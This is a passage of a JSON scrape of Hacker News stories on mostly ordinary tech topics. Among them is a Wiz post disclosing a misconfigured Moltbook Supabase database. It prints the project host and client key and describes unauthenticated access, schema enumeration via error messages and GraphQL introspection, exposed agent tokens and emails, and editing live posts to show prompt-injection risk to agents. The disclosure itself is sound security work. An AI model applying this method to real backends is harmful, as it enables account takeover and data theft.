comes up with.\n\nAlso, for the record, I amgyrovague-comon Hacker News.\n\nShare this:\n\nShare on X (Opens in new window)X\n\nShare on Facebook (Opens in new window)Facebook\n\nShare on LinkedIn (Opens in new window)LinkedIn\n\nRelated",
      "url": "https://gyrovague.com/2026/02/01/archive-today-is-directing-a-ddos-attack-against-my-blog/",
      "author_username": "gyrovague-com",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 222,
      "impressions_reposts": 0,
      "impressions_replies": 98,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:28.972827",
      "published_at": "2026-02-01T00:11:53",
      "scraped_at": "2026-02-03T09:02:28.972837",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46843805",
        "kids_count": 24,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "d890e62e6f426391b47f9242db68ab51"
    },
    {
      "id": "3d1beb45846791a0f0d53fdcf6df87c5",
      "source": "hackernews",
      "source_id": "46857615",
      "title": "Hacking Moltbook",
      "content": "What is Moltbook, and Why Did it Attract Our Attention?\n\nMoltbook, the weirdly futuristic social network, has quickly gone viral as a forum where AI agents post and chat. But what we discovered tells a different story - and provides a fascinating look into what happens when applications are vibe-coded into existence without proper security controls.\n\nWe identified a misconfigured Supabase database belonging to Moltbook, allowing full read and write access to all platform data. The exposure included 1.5 million API authentication tokens, 35,000 email addresses, and private messages between agents. We immediately disclosed the issue to the Moltbook team, who secured it within hours with our assistance, and all data accessed during the research and fix verification has been deleted.\n\nExecutive Summary\n\nMoltbook is a social platform designed exclusively for AI agents - positioned as the \"front page of the agent internet.\" The platform allows AI agents to post content, comment, vote, and build reputation through a karma system, creating what appears to be a thriving social network where AI is the primary participant.\n\nOver the past few days, Moltbook gainedsignificant attention in the AI community. OpenAI founding member Andrej Karpathy described it as \"genuinely the most incredible sci-fi takeoff-adjacent thing I have seen recently,\" noting how agents were \"self-organizing on a Reddit-like site for AIs, discussing various topics, e.g. even how to speak privately.\"\n\nThe Moltbook founderexplained publicly on Xthat he \"vibe-coded\" the platform:\n\nI didnâ€™t write a single line of code for @moltbook. I just had a vision for the technical architecture, and AI made it a reality.â€\n\nThis practice, while revolutionary, can lead to dangerous security oversights - similar to previous vulnerabilities we have identified, including theDeepSeek data leakandBase44 Authentication Bypass.\n\nWe conducted a non-intrusive security review, simply by browsing like normal users. Within minutes, we discovered a Supabase API key exposed in client-side JavaScript, granting unauthenticated access to the entire production database - including read and write operations on all tables.\n\nThe exposed data told a different story than the platform's public image - while Moltbook boasted 1.5 million registered agents, the database revealed only 17,000 human owners behind them - an 88:1 ratio. Anyonecould register millions of agentswith a simple loop and no rate limiting, and humans could post content disguised as \"AI agents\" via abasic POST request.The platform had no mechanism to verify whether an \"agent\" was actually AI or just a human with a script.The revolutionary AI social network was largely humans operating fleets of bots.\n\nHow the Moltbook Database Was Exposed\n\nDiscovery of Exposed Supabase Credentials\n\nWhen navigating to Moltbook's website, we examined the client-side JavaScript bundles loaded automatically by the page. Modern web applications bundle configuration values into static JavaScript files, which can inadvertently expose sensitive credentials.This is a recurring pattern we've observed in vibe-coded applications- API keys and secrets frequently end up in frontend code, visible to anyone who inspects the page source, often with significant security consequences.\n\nBy analyzing the production JavaScript file at -\n\nhttps://www.moltbook.com/_next/static/chunks/18e24eafc444b2b9.js\n\nWe identified hardcoded Supabase connection details:\n\n-Supabase Project: ehxbxtjliybbloantpwq.supabase.co\n\n-API Key: sb_publishable_4ZaiilhgPir-2ns8Hxg5Tw_JqZU_G6-\n\nThe discovery of these credentials does not automatically indicate a security failure, as Supabase is designed to operate with certain keys exposed to the client - the real danger lies in the configuration of the backend they point to.Supabase is a popular open-source Firebase alternative providing hosted PostgreSQL databases with REST APIs. It's become especially popular with vibe-coded applications due to its ease of setup. When properly configured with Row Level Security (RLS), the public API key is safe to expose - it acts like a project identifier.However, without RLS policies, this key grants full database access to anyone who has it.In Moltbookâ€™s implementation, this critical line of defense was missing.\n\nUnauthenticated Database Access via Supabase API\n\nUsing the discovered API key, we tested whether the recommended security measures were in place. We attempted to query the REST API directly - a request that should have returned an empty array or an authorization error if RLS were active.\n\nInstead, the database responded exactly as if we were an administrator. It immediately returned sensitive authentication tokens - including the API keys of the platformâ€™s top AI Agents.\n\nThis confirmed unauthenticated access to user credentials that would allow complete account impersonation of any user on the platform.\n\nDatabase Enumeration Through PostgREST and GraphQL\n\nBy leveraging Supabase's PostgREST error messages, we enumerated additional tables. Querying non-existent table names returned hints revealing the actual schema.\n\nUsing this technique combined with GraphQL introspection, we mapped the complete database schema and found around ~4.75 million records exposed.\n\nSensitive Data Exposed in the Moltbook Database\n\n1.API Keys and Authentication Tokens for AI Agents\n\nThe agents table exposed authentication credentials for every registered agent in the database\n\nEach agent record contained:\n\n- api_key - Full authentication token allowing complete account takeover\n\n- claim_token - Token used to claim ownership of an agent\n\n- verification_code - Code used during agent registration\n\nWith these credentials, an attacker couldfully impersonate any agent on the platform- posting content, sending messages, and interacting as that agent. This included high-karma accounts and well-known persona agents. Effectively, every account on Moltbook could be hijacked with a single API call.\n\n2.User Email Addresses and Identity Data\n\nThe owners table contained personal information for 17,000+ users\n\nAdditionally, by querying the GraphQL endpoint, we discovered a new observers table containing 29,631 additional email addresses - these were early access signups for Moltbook's upcoming â€œBuild Apps for AI Agentsâ€ product.\n\nUnlike Twitter handles which were publicly displayed on profiles, email addresses were meant to stay private - but were fully exposed in the database.\n\n3.Private Messages & Third-Party Credential Leaks\n\nThe agent_messages table exposed 4,060 private DM conversations between agents.\n\nWhile examining this table to understand agent-to-agent interactions, we discovered thatconversations were stored without any encryption or access controls-- some contained third-party API credentials, including plaintext OpenAI API keys shared between agents.\n\n4.Write Access - Modifying Live Posts\n\nBeyond read access, we confirmed full write capabilities. Even after the initial fix that blocked read access to sensitive tables, write access to public tables remained open. We tested it and were able to successfully modify existing posts on the platform.\n\nProving that any unauthenticated user could:\n\n- Edit any post on the platform\n\n- Inject malicious content or prompt injection payloads\n\n- Deface the entire website\n\n- Manipulate content consumed by thousands of AI agents\n\nThis raises questions aboutthe integrity of all platform content- posts, votes, and karma scores - during the exposure window.\n\nWe promptly notified the team again to apply write restrictions via RLS policies.\n\nOnce the fix was confirmed, I could no longer revert the post as write access was blocked. The Moltbook team deleted the content a few hours later and thanked us for our report.\n\n5 Key Security Lessons for AI-Built Apps\n\n#1. Speed Without Secure Defaults Creates Systemic Risk\n\nVibe codingunlocks remarkable speed and creativity, enabling founders to ship real products with unprecedented velocity - as demonstrated by Moltbook. At the same time, todayâ€™sAI tools donâ€™t yet reason about security posture or access controls on a developerâ€™s behalf, which means configuration details still benefit from careful human review. In this case, the issue ultimately traced back to a single Supabase configuration setting - a reminder of how small details can matter at scale.\n\n#2.Â  Participation Metrics Need Verification and Guardrails\n\nThe 88:1 agent-to-human ratio shows how \"agent internet\" metrics can be easily inflated without guardrails like rate limits or identity verification.While Moltbook reported 1.5 million agents, these were associated with roughly 17,000 human accounts, an average of about 88 agents per person. At the time of our review, there were limited guardrails such as rate limiting or validation of agent autonomy. Rather than a flaw, this likely reflects how early the â€œagent internetâ€ category still is: builders are actively exploring what agent identity, participation, and authenticity should look like, and the supporting mechanisms are still evolving.\n\n#3. Privacy Breakdowns Can Cascade Across AI Ecosystems\n\nSimilarly, the platformâ€™s approach to privacy highlights an important ecosystem-wide lesson. Users shared OpenAI API keys and other credentials in direct messages under the assumption of privacy, but a configuration issue made those messages publicly accessible. A single platform misconfiguration was enough to expose credentials for entirely unrelated services - underscoring how interconnected modern AI systems have become.\n\n#4. Write Access Introduces Far Greater Risk Than Data Exposure Alone\n\nWhile data leaks are bad, the ability to modify content and inject prompts into an AI ecosystem introduces deeper integrity risks, including content manipulation, narrative control, and prompt injection that can propagate downstream to other AI agents. As AI-driven platforms grow, these distinctions become increasingly important design considerations.\n\n#5. Se",
      "url": "https://www.wiz.io/blog/exposed-moltbook-database-reveals-millions-of-api-keys",
      "author_username": "galnagli",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://www.datocms-assets.com/75231/1769995179-image5.png?fm=webp",
          "alt": ""
        }
      ],
      "impressions_views": null,
      "impressions_likes": 355,
      "impressions_reposts": 0,
      "impressions_replies": 211,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:29.343847",
      "published_at": "2026-02-02T11:08:36",
      "scraped_at": "2026-02-03T09:02:29.343859",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46857615",
        "kids_count": 42,
        "sections": [
          "top_stories",
          "best_stories"
        ]
      },
      "content_hash": "f5e1e85b4a626cf8d9af330c749e93a7"
    },
    {
      "id": "281b54b268535893466b9b15ac2801e2",
      "source": "hackernews",
      "source_id": "46820142",
      "title": "4x faster network file sync with rclone (vs rsync) (2025)",
      "content": "4x faster network file sync with rclone (vs rsync)\n\nFor the past couple years, I have transported my 'working set' of video and project data to and from work on an external Thunderbolt NVMe SSD.\n\nBut it's always beenslowwhen I do the sync. In a typical day, I may generate a new project folder with 500-1000 individual files, and dozens of them may be 1-10 GB in size.\n\nThe Thunderbolt drive I had was capable of well over 5 GB/sec, and my 10 Gbps network connection is capable of 1 GB/sec. I evenupgraded my Thunderbolt drive to Thunderbolt 5 lately... though that was not the bottleneck.\n\nI used the following rsync command to copy files from a network share mounted on my Mac to the drive (which I call \"Shuttle\"):\n\nmercuryis so named because it's a fast NVMe-backed NAS volume on myArm NAS(all my network volumes are named after celestial bodies).\n\nAs a test, I deleted one of the dozen or so active projects off my 'Shuttle' drive, and ran myrsynccopy:\n\nThe full copy took over 8 minutes, for a total of about 59 GiB of files copied. There are two problems:\n\nrsyncperforms copies single-threaded,serially, meaning only one file is copied at a time\n\nEven for very large files,rsyncseems to max out on this network share around 350 MB/sec\n\nI had been playing with different compression algorithms, trying totarthen pipe that torsync, even experimenting with running thersyncdaemon instead of SSH... but never could I get asignificantspeedup! In fact, some compression modes would actually slow things down as my energy-efficient NAS is running on some slower Arm cores, and they bog things down a bit single-threaded...\n\nrcloneto the rescue\n\nI've been usingrcloneas part of my3-2-1 backup planfor years. It's amazing at copying, moving, and syncing files from and to almost any place (including Cloud storage, local storage, NAS volumes, etc.), but I had somehow pigeonholed it as \"for cloud to local or vice-versa\", and never considered it forlocaltransfer, like over my own LAN.\n\nBut it has an option that allows transfers in parallel,--multi-thread-streams, whichStack Overflow userdantebarbasuggestedsomeone use in the same scenario.\n\nSo I gave it a try.\n\nAfter fiddling a bit with the exact parameters to match rsync's-a, and handling the weird symlinks like.fcpcachedirectories Final Cut Pro spits out inside project files, I came up with:\n\nUsing this method, I could see my Mac's network connection quickly max out around 1 GB/sec, completing the same directory copy in 2 minutes:\n\nI'm not 100% sure whyrclonesays 59 GB were copied, versusrsync's 63 GB. Probably the exclusion of the.fcpcachedirectory?lol units... GiB vs GB ;)\n\nBut the conclusionÃ¢Â€Â”especially after seeing my 10 Gbps connectionfinallybeing fully utilizedÃ¢Â€Â”is thatrcloneis about 4x faster working in parallel.\n\nI also ran comparisons just changing out a couple files, andrcloneandrsyncwere almost identical, as the full scan of the directory tree for metadata changes takes about the same time on both (about 18 seconds). It's just the parallel file transfers that helprclonepull ahead.\n\nFurther reading:\n\nFirst look: ASUSTOR's new 12-bay all-M.2 NVMe SSD NAS\n\nDeadbolt impacts some ASUSTOR NASes Ã¢Â€Â” check your backup plan!\n\nMy Backup Plan\n\nComments",
      "url": "https://www.jeffgeerling.com/blog/2025/4x-faster-network-file-sync-rclone-vs-rsync/",
      "author_username": "indigodaddy",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 335,
      "impressions_reposts": 0,
      "impressions_replies": 149,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:29.425578",
      "published_at": "2026-01-29T22:17:32",
      "scraped_at": "2026-02-03T09:02:29.425589",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46820142",
        "kids_count": 26,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "ef576070667e5a751d8aacb013f96037"
    },
    {
      "id": "19b104125104bf6cabf7ee4bc25de985",
      "source": "hackernews",
      "source_id": "46863162",
      "title": "The TSA's New $45 Fee to Fly Without ID Is Illegal",
      "content": "The TSA's New $45 Fee to Fly Without ID Is Illegal",
      "url": "https://www.frommers.com/tips/airfare/the-tsa-new-45-fee-to-fly-without-id-is-illegal-says-regulatory-expert/",
      "author_username": "donohoe",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 489,
      "impressions_reposts": 0,
      "impressions_replies": 558,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:29.529615",
      "published_at": "2026-02-02T17:48:10",
      "scraped_at": "2026-02-03T09:02:29.529624",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46863162",
        "kids_count": 42,
        "sections": [
          "top_stories",
          "best_stories"
        ]
      },
      "content_hash": "7b27763a2141eda7d6162b7ee3ec4877"
    },
    {
      "id": "a1ca412b2b794e36c54444df2ce95bca",
      "source": "hackernews",
      "source_id": "46858829",
      "title": "Linux From Scratch ends SysVinit support",
      "content": "Subject:Linux From Scratch Announcements\n\nList archive\n\nThis button tries to protect the mailing list archives against address harvesting by a spammer.",
      "url": "https://lists.linuxfromscratch.org/sympa/arc/lfs-announce/2026-02/msg00000.html",
      "author_username": "cf100clunk",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 195,
      "impressions_reposts": 0,
      "impressions_replies": 272,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:30.240751",
      "published_at": "2026-02-02T12:45:27",
      "scraped_at": "2026-02-03T09:02:30.240768",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46858829",
        "kids_count": 30,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "36cfb68a661e6e6ce4e6b79326498516"
    },
    {
      "id": "3d5cba0d3d9ef4c3d1c20eb08627ece9",
      "source": "hackernews",
      "source_id": "46815995",
      "title": "Why The Jetsons still matters (2012)",
      "content": "Why The Jetsons still matters (2012)",
      "url": "https://www.smithsonianmag.com/history/50-years-of-the-jetsons-why-the-show-still-matters-43459669/",
      "author_username": "fortran77",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 26,
      "impressions_reposts": 0,
      "impressions_replies": 8,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:30.648440",
      "published_at": "2026-01-29T15:19:56",
      "scraped_at": "2026-02-03T09:02:30.648451",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46815995",
        "kids_count": 5,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "ddb252f17c34000b1534f20cef940243"
    },
    {
      "id": "d76bffadcc3adfb873476f71e307aea4",
      "source": "hackernews",
      "source_id": "46806346",
      "title": "Carnegie Mellon Unversity Computer Club FTP Server",
      "content": "Index of /pub\n\nWelcome to the Computer Club mirrors, a service of theCarnegie Mellon University Computer Club.\n\nRequests for additional mirrors will be considered on the basis of relevance\nand available disk space. Send mail to gripe@club.cc.cmu.edu.  Monetary and/or\nhardware contributions are welcome!  Please send us mail if you would like to\nmake a contribution.\n\nNote on scene.org:\n\nOn 2015-11-17, we were notified that the file parties/2012/demodays12/realtime_demo_size_limited/horology_www.exe was flagged by Sym^H^H^H^H a commercial antivirus vendor as malware, tainting their rating of the andrew.cmu.edu domain, and leading to \"scary browser warnings\". We were ordered to remove this file and it is not currently available. Sorry.Due to U.S. Exports Regulations, all cryptographic software on this\nsite is subject to the following legal notice:This site includes publicly available encryption source code\nwhich, together with object code resulting from the compiling of\npublicly available source code, may be exported from the United\nStates under License Exception \"TSU\" pursuant to 15 C.F.R. Section\n740.13(e).This legal notice applies to cryptographic software only. Please see theBureau of Industry and Securityfor more \ninformation about current U.S. regulations.\n\nDue to U.S. Exports Regulations, all cryptographic software on this\nsite is subject to the following legal notice:This site includes publicly available encryption source code\nwhich, together with object code resulting from the compiling of\npublicly available source code, may be exported from the United\nStates under License Exception \"TSU\" pursuant to 15 C.F.R. Section\n740.13(e).This legal notice applies to cryptographic software only. Please see theBureau of Industry and Securityfor more \ninformation about current U.S. regulations.\n\nDue to U.S. Exports Regulations, all cryptographic software on this\nsite is subject to the following legal notice:\n\nThis legal notice applies to cryptographic software only. Please see theBureau of Industry and Securityfor more \ninformation about current U.S. regulations.",
      "url": "http://128.237.157.9/pub/",
      "author_username": "1vuio0pswjnm7",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 106,
      "impressions_reposts": 0,
      "impressions_replies": 21,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:30.718150",
      "published_at": "2026-01-29T00:59:23",
      "scraped_at": "2026-02-03T09:02:30.718162",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46806346",
        "kids_count": 11,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "6a681235d157525aa9c83bd35cb8104d"
    },
    {
      "id": "cfc179044c5142a13f7aa54245c213df",
      "source": "hackernews",
      "source_id": "46858622",
      "title": "Zig Libc",
      "content": "Devlog\n\nThis page contains a curated list of recent changes to main branch Zig.\n\nAlso available as anRSS feed.\n\nThis page contains entries for the year2026. Other years are available inthe Devlog archive page.\n\nzig libc\n\nAuthor: Andrew Kelley\n\nOver the past month or so, several enterprising contributors have taken an interest in thezig libc subproject. The idea here is to incrementally delete redundant code, by providing libc functions as Zig standard library wrappers rather than as vendored C source files. In many cases, these functions are one-to-one mappings, such asmemcpyoratan2, or trivially wrap a generic function, likestrnlen:\n\nSo far, roughly 250 C source files have been deleted from the Zig repository, with 2032 remaining.\n\nWith each function that makes the transition, Zig gains independence from third party projects and from the C programming language, compilation speed improves, ZigÃ¢Â€Â™s installation size is simplified and reduced, and user applications which statically link libc enjoy reduced binary size.\n\nAdditionally, arecent enhancementnow makes zig libc share the Zig Compilation Unit with other Zig code rather than being a separate static archive, linked together later. This is one of the advantages of Zig having an integrated compiler and linker. When the exported libc functions share the ZCU, redundant code is eliminated because functions can be optimized together. ItÃ¢Â€Â™s kind of like enabling LTO (Link-Time Optimization) across the libc boundary, except itÃ¢Â€Â™s done properly in the frontend instead of too late, in the linker.\n\nFurthermore, when this work is combined with the recentstd.Io changes, there is potential for users to seamlessly control how libc performs I/O - for example forcing all calls toreadandwriteto participate in an io_uring event loop, even though that code was not written with such use case in mind. Or,resource leak detectioncould be enabled for third-party C code. For now this is only a vaporware idea which has not been experimented with, but the idea intrigues me.\n\nBig thanks to Szabolcs Nagy forlibc-test. This project has been a huge help in making sure that we donÃ¢Â€Â™t regress any math functions.\n\nAs a reminder to our users, now that Zig is transitioning to being the static libc provider, if you encounter issues with the musl, mingw-w64, or wasi-libc libc functionality provided by Zig,please file bug reports in Zig firstso we donÃ¢Â€Â™t annoy maintainers for bugs that are in Zig, and no longer vendored by independent libc implementation projects.\n\nAbolish ICE.",
      "url": "https://ziglang.org/devlog/2026/#2026-01-31",
      "author_username": "ingve",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 314,
      "impressions_reposts": 0,
      "impressions_replies": 126,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:31.115896",
      "published_at": "2026-02-02T12:28:19",
      "scraped_at": "2026-02-03T09:02:31.115906",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46858622",
        "kids_count": 17,
        "sections": [
          "top_stories",
          "best_stories"
        ]
      },
      "content_hash": "e1f7e7ee8dc81d7b7998238be32a7f82"
    },
    {
      "id": "b0047f10297e70e892ed1bd55ae717fc",
      "source": "hackernews",
      "source_id": "46848060",
      "title": "Pretty soon, heat pumps will be able to store and distribute heat as needed",
      "content": "Pretty soon, heat pumps will be able to store and distribute heat as needed\n\nHeat pumps are becoming increasingly common in private homes. But storing the heat they produce has not been possible â€“ until now. SINTEF andSwiss company COWA Thermal Solutionsresearchers are collaborating on the solution.\n\nâ€œThink of it as a thermal battery, which stores the heat from the heat pump and can be used later. In practice, this means that people get more energy out of the stored heat. It becomes easier and more comfortable to use, and the energy is also used in a smarter way,â€ says Galina Simonsen, a senior research scientist at SINTEF.\n\nSimonsen is a member of the team that has developed the new thermal batteries.\n\nâ€œThe batteries have high efficiency, and they charge and deliver heat quickly, making it easier to meet the need. Like when several people are taking showers one after the other, for example, or you need hot water early on a cold morning,â€ says Simonsen.\n\nThe solution will also benefit your wallet because it makes it possible to store excess heat when electricity is cheap or produced in an environmentally friendly way, and can be used when the need for more heat arises.\n\nResearch colleagues Martin Fossen and Galina Simonsen in front of the system that can store excess heat from heat pumps. Photo: Silje Grytli TvetenSHOW MORE\n\nProperties lie in salt hydrates\n\nHeat pumps extract energy from the environment â€“ air, soil or water â€“ and transport the heat into the home.\n\nHowever, in households and other buildings, the heat demand varies, depending on usage patterns, time of day, outdoor temperature and weather conditions. The researchers on this project have worked to meet these fluctuations in a smarter way.\n\nâ€œA heat pump that runs constantly is expensive, energy-consuming and can lead to overloading the power grid. With the new batteries, heat pumps combine storage andsmart distribution of heat,â€ says Simonsen.\n\nFirst out with a solution for private individuals\n\nâ€œThe research team at SINTEF has collaborated closely with the Swiss company COWA Thermal Solutions to develop their solution. Although thermal energy storage already exists, the team is among the first to have managed to create a solution that is so effective that it is attractive for private homes.\n\nThe secret lies in a combination of technical solutions and materials called salt hydrates.\n\nStudies of salt hydrates in the laboratory at COWA Thermal Solutions. Photo: COWA Thermal SolutionsSHOW MORE\n\nâ€œUnlike the salt we sprinkle on food, salt hydrates lock water into their structure and behave in a unique way when exposed to heat,â€ says Simonsen.\n\nSubstances that can undergo this physical transformation, from melting to solidification, belong to a broader group of materials known as â€œphase change materials.â€\n\nHere you can read about the company Cartesian, which has created a similar solution for both heating and cooling large buildings based on solar or wind power:\n\nBio-batteries enable us to store solar and wind energy\n\nâ€œThink of thermal batteries as sponges: When theyâ€™re heated to a certain temperature, they undergo a change from solid to liquid and can store heat. When they are cooled, they return to solid form and release heat again,â€ says Simonsen.\n\nâ€œThey can store much more thermal energy than water, for example, and they retain heat longer, even if the temperature does not change that much.â€\n\nIn other words: more heat and more stable temperatures.\n\nSpace-saving solution\n\nSalt hydrates thus open up completely new possibilities for smart and more balanced heating systems because heating can be moved to times with low energy demand.\n\nâ€œSalt hydrates arenâ€™t toxic, theyâ€™re not flammable and they are also relatively inexpensive. This makes them a safe and good choice for use in private homes. Heat storage with salt hydrates also takes up less space than a traditional hot water tank, often up to four times less,â€ says Simonsen.About the Sure2Coat project:The work is being carried out as part of the EU-funded project Sure2Coat and in close collaboration with the Swiss company COWA Thermal Solutions and research partners. COWA has worked to develop and improve the salt hydrates with new additives, so that the materials are stable and can function for decades without losing their special properties. SINTEF has worked to improve the efficiency of the batteries themselves.Traditional systems often have low efficiency and can take a long time to charge and provide heat to the house. By using thin cooling fins, the researchers have managed to increase the efficiency of the new batteries from 65 to 85 percent. At the same time, charging time has been reduced by over 70 percent and the time it takes to release the heat has been cut by more than 80 percent.The EU-funded Sure2Coat project is a collaboration between 14 partners in industry and research in 7 European countries. The project involves developing and implementing new or improved methods for surface treatment and coating of surfaces for different types of metals. The methods are demonstrated through three specific application areas: the gearbox, gas-water heater and latent heat storage.Through the project, end users will effectively reduce their energy use, material consumption, CO2emissions and pollution from production. The goal is to contribute positively to European industry and the EU's growth strategy by integrating surface treatment methods into the production line.Learn more about Sure2Coat.Recycled aluminium usedSINTEFâ€™s task in the project has been to improve the efficiency itself. That is, how the heat is stored and released in the batteries.â€œSpecifically, we have designed and tested a type of heat sink that improves heat transfer in the thermal batteries,â€ says Simonsen.The cooling fins are thin metal structures made of recycled aluminium that are effective heat conductors. This means that the heat is distributed quickly and evenly through the salt hydrate.Researcher Galina Simonsen with the cooling fins used in the solution. Photo: SINTEFSHOW MOREâ€œAluminium is a light material, has good thermal conductivity and is easy to form. The use of recycled aluminium also reduces the environmental footprint and costs, and helps to promote a more circular use of materials.At the same time, recycled aluminium poses a challenge: it can contain impurities that make it more vulnerable to corrosion.â€œCorrosion is particularly critical because salt hydrates are tough on aluminium, especially when impurities are present. Without protection, the cooling fins can degrade over time, reducing performance and shortening the lifespan of the entire system,â€ Simonsen explains.To solve this problem, the researchers have employed a type of coating called plasma electrolytic oxidation (PEO), which forms a thin, ceramic layer on the surface of the aluminium.â€œThis coating is similar to what is used on non-stick pans and provides a very durable and corrosion-resistant barrier,â€ says the researcher.The researchers constructed a bathroom: the box in the middle stores heat during periods of low energy consumption and later releases it to deliver hot water to the shower. Photo: SINTEFSHOW MORE\n\nAbout the Sure2Coat project:\n\nThe work is being carried out as part of the EU-funded project Sure2Coat and in close collaboration with the Swiss company COWA Thermal Solutions and research partners. COWA has worked to develop and improve the salt hydrates with new additives, so that the materials are stable and can function for decades without losing their special properties. SINTEF has worked to improve the efficiency of the batteries themselves.\n\nTraditional systems often have low efficiency and can take a long time to charge and provide heat to the house. By using thin cooling fins, the researchers have managed to increase the efficiency of the new batteries from 65 to 85 percent. At the same time, charging time has been reduced by over 70 percent and the time it takes to release the heat has been cut by more than 80 percent.\n\nThe EU-funded Sure2Coat project is a collaboration between 14 partners in industry and research in 7 European countries. The project involves developing and implementing new or improved methods for surface treatment and coating of surfaces for different types of metals. The methods are demonstrated through three specific application areas: the gearbox, gas-water heater and latent heat storage.\n\nThrough the project, end users will effectively reduce their energy use, material consumption, CO2emissions and pollution from production. The goal is to contribute positively to European industry and the EU's growth strategy by integrating surface treatment methods into the production line.\n\nLearn more about Sure2Coat.\n\nRecycled aluminium used\n\nSINTEFâ€™s task in the project has been to improve the efficiency itself. That is, how the heat is stored and released in the batteries.\n\nâ€œSpecifically, we have designed and tested a type of heat sink that improves heat transfer in the thermal batteries,â€ says Simonsen.\n\nThe cooling fins are thin metal structures made of recycled aluminium that are effective heat conductors. This means that the heat is distributed quickly and evenly through the salt hydrate.\n\nResearcher Galina Simonsen with the cooling fins used in the solution. Photo: SINTEFSHOW MORE\n\nâ€œAluminium is a light material, has good thermal conductivity and is easy to form. The use of recycled aluminium also reduces the environmental footprint and costs, and helps to promote a more circular use of materials.\n\nAt the same time, recycled aluminium poses a challenge: it can contain impurities that make it more vulnerable to corrosion.\n\nâ€œCorrosion is particularly critical because salt hydrates are tough on aluminium, especially when impurities are present. Without protection, the cooling fins can degrade over time, reducing performance and shortening the lifespan of the entire system,â€ Simonsen explains.\n\nTo solve this problem, th",
      "url": "https://www.sintef.no/en/latest-news/2026/pretty-soon-heat-pumps-will-be-able-to-store-and-distribute-heat-as-needed/",
      "author_username": "PaulHoule",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 235,
      "impressions_reposts": 0,
      "impressions_replies": 195,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:31.929462",
      "published_at": "2026-02-01T13:15:40",
      "scraped_at": "2026-02-03T09:02:31.929474",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46848060",
        "kids_count": 21,
        "sections": [
          "top_stories",
          "best_stories"
        ]
      },
      "content_hash": "52d2c6b65d7a441608b3f714e464f53a"
    },
    {
      "id": "31cd7da178429185ff9190e0495de026",
      "source": "hackernews",
      "source_id": "46855447",
      "title": "Nano-vLLM: How a vLLM-style inference engine works",
      "content": "Architecture, Scheduling, and the Path from Prompt to Token\n\nWhen deploying large language models in production, the inference engine becomes a critical piece of infrastructure. Every LLM API you use Ã¢Â€Â” OpenAI, Claude, DeepSeek Ã¢Â€Â” is sitting on top of an inference engine like this. While most developers interact with LLMs through high-level APIs, understanding what happens beneath the surfaceÃ¢Â€Â”how prompts are processed, how requests are batched, and how GPU resources are managedÃ¢Â€Â”can significantly impact system design decisions.\n\nThis two-part series explores these internals throughNano-vLLM, a minimal (~1,200 lines of Python) yet production-grade implementation that distills the core ideas behindvLLM, one of the most widely adopted open-source inference engines.\n\nNano-vLLM was created by a contributor to DeepSeek, whose name appears on the technical reports of models like DeepSeek-V3 and R1. Despite its minimal codebase, it implements the essential features that make vLLM production-ready: prefix caching, tensor parallelism, CUDA graph compilation, and torch compilation optimizations. Benchmarks show it achieving throughput comparable toÃ¢Â€Â”or even slightly exceedingÃ¢Â€Â”the full vLLM implementation. This makes it an ideal lens for understanding inference engine design without getting lost in the complexity of supporting dozens of model architectures and hardware backends.\n\nIn Part 1, we focus on the engineering architecture: how the system is organized, how requests flow through the pipeline, and how scheduling decisions are made. We will treat the actual model computation as a black box for nowÃ¢Â€Â”Part 2 will open that box to explore attention mechanisms, KV cache internals, and tensor parallelism at the computation level.\n\nThe Main Flow: From Prompt to Output\n\nThe entry point to Nano-vLLM is straightforward: anLLMclass with ageneratemethod. You pass in an array of prompts and sampling parameters, and get back the generated text. But behind this simple interface lies a carefully designed pipeline that transforms text into tokens, schedules computation efficiently, and manages GPU resources.\n\nFrom Prompts to Sequences\n\nWhengenerateis called, each prompt string goes through a tokenizerÃ¢Â€Â”a model-specific component that splits natural language into tokens, the fundamental units that LLMs process. Different model families 